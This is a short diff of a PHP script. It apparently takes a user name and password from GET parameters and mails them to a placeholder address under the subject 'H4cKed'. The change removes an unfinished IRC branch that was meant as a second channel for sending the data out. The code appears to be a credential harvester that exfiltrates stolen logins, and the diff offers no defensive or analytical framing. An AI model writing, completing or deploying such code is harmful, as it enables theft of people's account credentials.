@@ -49,9 +49,6 @@ if($_GET['user'] and $_GET['password']){
                     $msg = wordwrap($msg,70);
                     mail("TBD","H4cKed",$msg);
                     break;
-                case 'IRC';
-                    // TODO send IRC
-                    break;
             }
         }
 
